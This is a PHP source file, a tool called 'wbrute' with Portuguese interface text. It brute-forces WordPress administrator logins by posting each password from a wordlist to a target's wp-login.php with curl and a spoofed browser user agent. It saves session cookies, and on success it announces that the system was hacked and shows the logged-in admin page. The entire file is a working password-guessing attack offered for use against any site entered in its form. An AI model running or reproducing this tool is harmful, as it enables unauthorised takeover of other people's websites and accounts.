<?php
/*

it works , but is beta version, i will remake this in C on future...
                      _                _       
__      ___ __       | |__  _ __ _   _| |_ ___ 
\ \ /\ / / '_ \ _____| '_ \| '__| | | | __/ _ \
 \ V  V /| |_) |_____| |_) | |  | |_| | ||  __/
  \_/\_/ | .__/      |_.__/|_|   \__,_|\__\___|
         |_|                                   
coded by Cooler_

just another code to brute force wordpress AUTH

contact: c00f3r[at]gmail[dot]com

bugsec.com.br


need word list in the file to crack
if crack doe auto auth the wordpress using cookies...

*/
// Definindo encode pra UTF-8
header('Content-type: text/html; charset="utf-8"',true);

// Compress com gzip para ficar mais rapida a pagina ela fica comprimida
ob_start("ob_gzhandler");

//forms post
$username=$_POST['username'];
$url=$_POST['url'];
$wordlist=$_POST['wordlist'];


if(($username)&&($url)&&($wordlist)) 
{
 $cookie="cookie.txt";
 $wordlist = file_get_contents($wordlist);
 $wordlist = explode("\n", $wordlist);
 print " Testando passwords...<br>";
 foreach($wordlist as $passwd)
 {
	$postdata = "log=". $username ."&pwd=". $passwd ."&wp-submit=Log%20In&redirect_to=". $url ."wp-admin/&testcookie=1";
	$ch = curl_init();
	curl_setopt ($ch, CURLOPT_URL, $url . "wp-login.php");
	curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6");
	curl_setopt ($ch, CURLOPT_TIMEOUT, 60);
	curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie);
	curl_setopt ($ch, CURLOPT_REFERER, $url . "wp-admin/");
	curl_setopt ($ch, CURLOPT_POSTFIELDS, $postdata);
	curl_setopt ($ch, CURLOPT_POST, 1);
	$result = curl_exec ($ch);
	curl_close($ch);
	//$procurar="ERROR:";
	//$achou=stripos($result,$procurar);
	//if($achou > 0) { 
         
   if(preg_match("/<div id=\"login_error\">/i",$result))
   {
        print "<font color=\"red\">não entrou $username , \"$passwd\"</font> <br>"; 
   } else { 
        print "<font color=\"green\">entrou sistema foi hackeado com sucesso usando login $username e senha $passwd </font><br>\n"; 
        echo $result; exit; }
 }
} else {


$form="
        <body bgcolor=\"#FFFFFF\"><div align=\"center\">
        <img src=\"http://upload.wikimedia.org/wikipedia/en/thumb/7/70/Splatterhouse_arcadeflyer.png/250px-Splatterhouse_arcadeflyer.png\"><font color=\"black\">
        <p>Quebrador de senhas do Wordpress wbrute codado por Cooler_</p>
	<form enctype=\"multipart/form-data\" action=\"wbrute.php\" method=\"POST\">
	Alvo: <input type=\"text\" name=\"url\" value=\"http://Target.com/wp/\"><br>
        Login: <input type=\"text\" name=\"username\" value=\"admin\"><br>
        Lista de senhas: <input type=\"text\" name=\"wordlist\" value=\"lista.txt\">
	<input type=\"submit\" value=\"Testar\" />
	</form></font></div>";
print $form;

}


?>
